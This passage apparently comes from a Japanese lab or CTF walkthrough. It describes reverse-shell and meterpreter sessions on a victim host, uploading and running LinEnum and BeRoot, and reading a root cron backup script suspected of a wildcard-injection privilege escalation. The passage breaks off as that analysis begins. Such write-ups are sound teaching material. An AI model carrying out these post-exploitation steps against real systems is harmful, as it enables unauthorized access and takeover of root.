&lt;p&gt;セッションを見てみます。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./switch_meterpreter_sessions.png&#34;/&gt;
&lt;/figure&gt;

&lt;br/&gt;
id: 2 は WSO からリバースシェル接続したセッションです。  
id: 3 は id:2のセッションを使って注入・接続したmeterpreterセッションです。
&lt;br/&gt;
&lt;h4 id=&#34;小ネタどのようにmeterpreterにスイッチされる&#34;&gt;(小ネタ)どのようにmeterpreterにスイッチされる？&lt;/h4&gt;
&lt;p&gt;msfconsoleではshellからmeterpreterを起動させましたが、実際metasploitはどのようにやっているのでしょう。&lt;br&gt;
実際にパケットをとってみると以下のようになっていました。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./switch_meterpreter_pcap.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;ワンライナーでmeterpreterのstagerをvictimに実行させてるんですね。&lt;br&gt;
stagerはLHOSTに記載のホストに接続し、meterpreter stageを読み込み、実行します。&lt;br&gt;
なお、ワンライナーの内容の通り、/tmpにランダム文字列で一時的にファイルを保存しますが、stagerが起動したらファイルは削除されます。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;権限昇格の可能性の調査&#34;&gt;権限昇格の可能性の調査&lt;/h1&gt;
&lt;p&gt;meterpreterも手に入ったところで、権限昇格できるか色々調査していきます。&lt;/p&gt;
&lt;p&gt;Linuxに対する権限昇格については以下の記事が参考になりました。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/&#34;&gt;https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;後述するLinEnum、BeRootの詳細も書かれていて良記事です。&lt;/p&gt;
&lt;h3 id=&#34;各種情報の取得&#34;&gt;各種情報の取得&lt;/h3&gt;
&lt;p&gt;LinEnumを使います。&lt;br&gt;
LinEnumは、システムの設定不備によって権限昇格が行える箇所がないかチェックするスクリプトです。&lt;br&gt;
その他、嬉しい情報も集めてくれます。&lt;/p&gt;
&lt;p&gt;meterpreterでvictimにアップロードし実行。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; upload LinEnum.sh /tmp/.session
[*] uploading  : LinEnum.sh -&amp;gt; /tmp/.session
[*] uploaded   : LinEnum.sh -&amp;gt; /tmp/.session/LinEnum.sh
meterpreter &amp;gt; shell
Process 1613 created.
Channel 4 created.

pwd
/tmp/.session
chmod u+x LinEnum.sh

./LinEnum.sh | tee LinEnum_out.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;結果は非常に長大なため省略します。&lt;/p&gt;
&lt;p&gt;結果をみたところ即脆弱性につながる情報はありませんでしたが、以下のいい情報が得られました。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;105&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sshd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;65534&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nogroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;65534&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nogroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ecadmin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ecadmin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ecadmin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Are permissions on /home directories lax:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total 12K
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root    root    4.0K May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 18:58 .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root    root    4.0K May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 18:50 ..
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ecadmin ecadmin 4.0K May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 19:40 ecadmin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/etc/cron.daily:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 19:37 .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 18:58 ..
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;102&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; 19:45 .placeholder
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;625&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; apache2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;15000&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; apt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;695&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 19:39 bakProductImage.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;1597&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; dpkg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;4125&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; exim4-base
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;249&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; passwd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### SERVICES #############################################&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Running processes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root      &lt;span class=&#34;m&#34;&gt;1305&lt;/span&gt;  0.0  0.0  &lt;span class=&#34;m&#34;&gt;55184&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2824&lt;/span&gt; ?        Ss   18:59   0:00 /usr/sbin/sshd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;この結果から、3つのことがわかります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sshが2222/tcpで動いている&lt;/li&gt;
&lt;li&gt;ecadminというユーザが存在する&lt;/li&gt;
&lt;li&gt;/etc/cron.dailyに「bakProductImage.sh」という恐らく自作のシェルスクリプトがある&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;※/etc/cron.daily/ 配下のスクリプトは、cronによって日次で実行されるものです。&lt;/p&gt;
&lt;h3 id=&#34;脆弱性の有無調査&#34;&gt;脆弱性の有無調査&lt;/h3&gt;
&lt;p&gt;BeRootを使います。&lt;br&gt;
BeRootはプラットフォームの脆弱性を調査するlinux-exploit-suggesterというスクリプトの機能に加えて、汎用的に発生しがちな脆弱性も調査してくれるスクリプトです。&lt;/p&gt;
&lt;p&gt;meterpreterでvictimにアップロードし実行。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
meterpreter &amp;gt; upload beroot_linux.tar /tmp/.session
[*] uploading  : beroot_linux.tar -&amp;gt; /tmp/.session  
[*] uploaded   : beroot_linux.tar -&amp;gt; /tmp/.session/beroot_linux.tar
meterpreter &amp;gt; shell
Process 2088 created.
Channel 6 created.

tar xf beroot_linux.tar 
(snip)

cd beroot_linux
python beroot.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;実行した結果、プラットフォームに関する脆弱性はありませんでした。&lt;/p&gt;
&lt;p&gt;しかし、汎用的な脆弱性を見つけるルーチンで意外なものを見つけました。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./beroot_out.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;サーバ管理者が設置した「bakProductImage.sh」に脆弱性があるかもしれないという示唆です。&lt;/p&gt;
&lt;br/&gt;
&lt;h3 id=&#34;bakproductimagesh-の調査&#34;&gt;bakProductImage.sh の調査&lt;/h3&gt;
&lt;p&gt;さて、LinEnumとBeRootで見つけたbakProductImage.shが何者かを調べます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bakDir&lt;span class=&#34;o&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;img_dir_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;dir_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;basename &lt;span class=&#34;nv&#34;&gt;$img_dir_path&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        tar -C &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;dirname &lt;span class=&#34;nv&#34;&gt;$img_dir_path&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; -cf &lt;span class=&#34;nv&#34;&gt;$work_dir&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$dir_name&lt;/span&gt;.tar &lt;span class=&#34;nv&#34;&gt;$dir_name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ecshop_dir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/www/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;bak_dir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/backups/ecshop
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;date +&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y%m%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TMP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;mktemp -d&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;trap&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm -rf &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TMP&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; EXIT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;work_dir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TMP&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$date&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir &lt;span class=&#34;nv&#34;&gt;$work_dir&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#archive product image dir&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;image_dirs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; find &lt;span class=&#34;nv&#34;&gt;$ecshop_dir&lt;/span&gt;/images -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt; -type d &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; dir in &lt;span class=&#34;nv&#34;&gt;$image_dirs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;isProductDir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;find &lt;span class=&#34;nv&#34;&gt;$dir&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s1&#34;&gt;&amp;#39;goods_img&amp;#39;&lt;/span&gt; -type d  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;wc -l&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isProductDir&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                bakDir &lt;span class=&#34;nv&#34;&gt;$dir&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#backup&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -C &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;dirname &lt;span class=&#34;nv&#34;&gt;$work_dir&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; -cf &lt;span class=&#34;nv&#34;&gt;$bak_dir&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$date&lt;/span&gt;.tar &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;basename &lt;span class=&#34;nv&#34;&gt;$work_dir&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chown ecadmin &lt;span class=&#34;nv&#34;&gt;$bak_dir&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$date&lt;/span&gt;.tar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm -rf &lt;span class=&#34;nv&#34;&gt;$TMP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ECShopのサイトにある商品画像をバックアップするスクリプトのようです。&lt;br&gt;
パッと見は普通のスクリプトですね。&lt;/p&gt;
&lt;p&gt;findコマンドで「/var/www/html/images/」直下のディレクトリを取得し、&lt;br&gt;
そのディレクトリの直下に&amp;quot;goods_img&amp;quot;ディレクトリが存在するかを確認します。&lt;br&gt;
goods_imgディレクトリが存在したらそのディレクトリはバックアップ対象になるようですね。&lt;/p&gt;
&lt;p&gt;保存先は /var/backups/ecshop で、%Y%m%d.tar の形式でアーカイブされるようです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -la /var/backups/ecshop/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;tail -n &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ecadmin root &lt;span class=&#34;m&#34;&gt;4700160&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 01:00 20190509.tar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ecadmin root &lt;span class=&#34;m&#34;&gt;4700160&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 01:00 20190510.tar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ecadmin root &lt;span class=&#34;m&#34;&gt;4700160&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 01:00 20190511.tar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;日時を見るに、毎日1時にcronが走っているんですね。&lt;/p&gt;
&lt;p&gt;また、以下からcronはroot権限で行われていることが推測できます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;スクリプト内の最後でchownで所有者をecadminに変更している&lt;/li&gt;
&lt;li&gt;バックアップ先のファイルの所有グループがrootのまま&lt;/li&gt;
&lt;/ul&gt;
&lt;br/&gt;
&lt;h3 id=&#34;ここまででわかっていること&#34;&gt;ここまででわかっていること&lt;/h3&gt;
&lt;p&gt;今までの情報が多かったので、一旦まとめます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LinEnumの結果から、設定不備による特権昇格はできなさそう&lt;/li&gt;
&lt;li&gt;BeRootの結果から、OSにインストールされているサーバソフトウェアに脆弱性はない&lt;/li&gt;
&lt;li&gt;BeRootの結果から、cron.dialy/bakProductImage.sh には find 周りに脆弱性がありそう&lt;/li&gt;
&lt;li&gt;バックアップファイルの所有者・所有グループから、cronはroot権限で実行されてそう&lt;/li&gt;
&lt;/ul&gt;
&lt;br/&gt;
&lt;h1 id=&#34;wildcard-injectionの原理と検証&#34;&gt;Wildcard Injectionの原理と検証&lt;/h1&gt;
&lt;p&gt;BeRootは bakProductImage.shのfindコマンドに脆弱性の可能性ありと指摘しました。&lt;/p&gt;
&lt;p&gt;bakProductImage.sh のfind周りを見てみます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;image_dirs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; find &lt;span class=&#34;nv&#34;&gt;$ecshop_dir&lt;/span&gt;/images -maxdepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -name &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt; -type d &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
